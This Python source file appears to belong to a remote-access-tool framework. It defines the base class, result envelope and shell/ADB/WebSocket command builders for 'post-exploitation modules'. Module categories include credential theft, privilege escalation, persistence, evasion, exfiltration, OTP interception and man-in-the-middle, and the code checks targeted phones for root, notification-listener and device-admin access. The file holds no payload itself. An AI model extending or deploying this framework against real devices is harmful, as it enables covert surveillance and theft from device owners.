"""Module base class and result envelope - extended implementation."""

from __future__ import annotations

import abc
import json
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Callable

from quantum.core.bus import BUS, publish_task_event
from quantum.core.artifacts import register_artifact, register_artifact_bytes
from quantum.rat.tasks import Task, TaskState, queue_task, get_task
from quantum.rat.registry import get_device, update_device_state


@dataclass
class ModuleResult:
    """Result of a module execution."""
    ok: bool
    raw: str = ""
    parsed: Dict[str, Any] = field(default_factory=dict)
    artifacts: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ""
    next_actions: List[Dict[str, Any]] = field(default_factory=list)

    def add_artifact(
        self,
        device_id: str,
        kind: str,
        data: bytes,
        filename: str,
        task_id: Optional[str] = None,
        seal: bool = False,
    ) -> Dict[str, Any]:
        """Add an artifact from bytes."""
        artifact = register_artifact_bytes(device_id, kind, data, filename, task_id, seal)
        self.artifacts.append(artifact.to_dict())
        return artifact.to_dict()

    def add_artifact_file(
        self,
        device_id: str,
        kind: str,
        path: str,
        task_id: Optional[str] = None,
        seal: bool = False,
        move: bool = False,
    ) -> Dict[str, Any]:
        """Add an artifact from a file."""
        artifact = register_artifact(device_id, kind, path, task_id, seal, move)
        self.artifacts.append(artifact.to_dict())
        return artifact.to_dict()

    def suggest_next(self, module: str, args: Dict[str, Any], auto_queue: bool = False, reason: str = "") -> None:
        """Suggest a next action."""
        self.next_actions.append({
            "module": module,
            "args": args,
            "auto_queue": auto_queue,
            "reason": reason,
        })

    def to_dict(self) -> Dict[str, Any]:
        return {
            "ok": self.ok,
            "raw": self.raw,
            "parsed": self.parsed,
            "artifacts": self.artifacts,
            "error": self.error,
            "next_actions": self.next_actions,
        }


class Module(abc.ABC):
    """Base class for all post-exploitation modules."""

    # Module metadata (override in subclasses)
    name: str = ""                    # snake_case, unique identifier
    lane: str = "CUSTOM"              # CREDS|CRYPTO|PRIVESC|PERSIST|EVASION|NET|RADIO|EXFIL|CONTROL|ACCOUNT|OTP|MITM|ABUSE|FORENSIC
    platforms: tuple = ("linux", "windows", "macos", "android", "ios")
    requires: str = "stock"           # stock|shell|root|a11y|admin|network|hardware
    destructive: bool = False
    reversible: bool = False
    args: Dict[str, Dict[str, Any]] = {}  # {name: {"type":..,"default":..,"help":..,"required":..}}
    timeout_s: int = 120
    description: str = ""

    def __init__(self):
        if not self.name:
            raise ValueError("Module must have a name")
        if self.lane not in MODULE_LANES:
            raise ValueError(f"Invalid lane: {self.lane}")

    @abc.abstractmethod
    def build(self, args: Dict[str, Any]) -> str:
        """Build the command to execute.
        
        Returns:
            Shell command / ADB command / WebSocket message to send to agent
        """
        pass

    @abc.abstractmethod
    def parse(self, raw: str, args: Dict[str, Any]) -> ModuleResult:
        """Parse raw output into structured result.
        
        Args:
            raw: Raw output from command execution
            args: Arguments passed to the module
            
        Returns:
            ModuleResult with parsed data
        """
        pass

    def verify(self, device_id: str = "") -> bool:
        """Verify module can run (dependencies, permissions, etc.).
        
        Args:
            device_id: Optional device ID to check requirements against
            
        Returns:
            True if module is verified and can run
        """
        if device_id:
            return self._check_requirements(device_id)
        return True

    def _check_requirements(self, device_id: str) -> bool:
        """Check device meets module requirements."""
        device = get_device(device_id)
        if not device:
            return False

        if self.requires == "root" and not device.capabilities.has_root:
            return False
        if self.requires == "a11y" and not device.capabilities.notification_listener:
            return False
        if self.requires == "admin" and not device.capabilities.device_admin_apps:
            return False
        if self.requires == "adb" and not device.capabilities.adb_enabled:
            return False
        if self.requires == "network" and not device.ip_local:
            return False

        return True

    def rollback(self, args: Dict[str, Any], result: ModuleResult) -> Optional[str]:
        """Generate rollback command for reversible modules.
        
        Returns:
            Command to undo the module's effects, or None if not reversible
        """
        return None

    def pre_run(self, device_id: str, args: Dict[str, Any]) -> bool:
        """Pre-run checks. Return False to abort."""
        return True

    def post_run(self, device_id: str, args: Dict[str, Any], result: ModuleResult) -> None:
        """Post-run cleanup/actions."""
        pass

    def get_help(self) -> str:
        """Get module help text."""
        lines = [f"{self.name} - {self.description}" if self.description else self.name]
        lines.append(f"  Lane: {self.lane}")
        lines.append(f"  Platforms: {', '.join(self.platforms)}")
        lines.append(f"  Requires: {self.requires}")
        lines.append(f"  Destructive: {self.destructive}")
        lines.append(f"  Reversible: {self.reversible}")
        lines.append(f"  Timeout: {self.timeout_s}s")
        if self.args:
            lines.append("  Arguments:")
            for arg_name, arg_def in self.args.items():
                req = " (required)" if arg_def.get("required") else ""
                default = arg_def.get("default")
                if default is not None:
                    lines.append(f"    {arg_name}: {arg_def['help']} [default: {default}]{req}")
                else:
                    lines.append(f"    {arg_name}: {arg_def['help']}{req}")
        return "\n".join(lines)


# Valid lanes
MODULE_LANES = {
    "CREDS", "CRYPTO", "PRIVESC", "PERSIST", "EVASION",
    "NET", "RADIO", "EXFIL", "CONTROL", "ACCOUNT",
    "OTP", "MITM", "ABUSE", "FORENSIC", "CUSTOM",
}


# Helper mixins for common patterns

class ShellModuleMixin:
    """Mixin for modules that execute shell commands."""
    
    def build_shell_cmd(self, command: str, args: Dict[str, Any], sudo: bool = False) -> str:
        """Build a shell command with proper escaping."""
        # Substitute args into command template
        for key, value in args.items():
            placeholder = f"{{{key}}}"
            if placeholder in command:
                if isinstance(value, str):
                    # Escape for shell
                    escaped = value.replace("'", "'\\''")
                    command = command.replace(placeholder, f"'{escaped}'")
                else:
                    command = command.replace(placeholder, str(value))
        
        if sudo:
            command = f"sudo {command}"
        
        return command


class ADBModuleMixin:
    """Mixin for modules that execute ADB commands."""
    
    def build_adb_cmd(self, command: str, args: Dict[str, Any], device_serial: str = "") -> str:
        """Build an ADB command."""
        adb_prefix = "adb"
        if device_serial:
            adb_prefix += f" -s {device_serial}"
        
        # Substitute args
        for key, value in args.items():
            placeholder = f"{{{key}}}"
            if placeholder in command:
                command = command.replace(placeholder, str(value))
        
        return f"{adb_prefix} shell {command}"


class WSModuleMixin:
    """Mixin for modules that communicate via WebSocket."""
    
    def build_ws_message(self, action: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Build a WebSocket message for the agent."""
        return {
            "action": action,
            "module": self.name,
            "args": args,
            "timestamp": time.time(),
        }


# Common argument definitions

def arg_string(name: str, default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
    """String argument definition."""
    return {"type": "string", "default": default, "help": help, "required": required}


def arg_int(name: str, default: int = 0, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Integer argument definition."""
    return {"type": "integer", "default": default, "help": help, "required": required}


def arg_float(name: str, default: float = 0.0, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Float argument definition."""
    return {"type": "number", "default": default, "help": help, "required": required}


def arg_bool(name: str, default: bool = False, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Boolean argument definition."""
    return {"type": "boolean", "default": default, "help": help, "required": required}


def arg_list(name: str, default: List = None, help: str = "", required: bool = False) -> Dict[str, Any]:
    """List argument definition."""
    return {"type": "array", "default": default or [], "help": help, "required": required}


def arg_enum(name: str, choices: List[str], default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
    """Enum argument definition."""
    return {"type": "string", "enum": choices, "default": default, "help": help, "required": required}


def arg_file(name: str, help: str = "", required: bool = False) -> Dict[str, Any]:
    """File path argument definition."""
    return {"type": "file", "help": help, "required": required}


# Result helpers

def success_result(raw: str = "", parsed: Dict = None, artifacts: List = None) -> ModuleResult:
    """Create a successful result."""
    return ModuleResult(
        ok=True,
        raw=raw,
        parsed=parsed or {},
        artifacts=artifacts or [],
    )


def error_result(error: str, raw: str = "") -> ModuleResult:
    """Create an error result."""
    return ModuleResult(
        ok=False,
        raw=raw,
        error=error,
    )


def partial_result(raw: str, parsed: Dict = None, error: str = "") -> ModuleResult:
    """Create a partial result (some data but with warnings)."""
    return ModuleResult(
        ok=bool(not error),
        raw=raw,
        parsed=parsed or {},
        error=error,
    )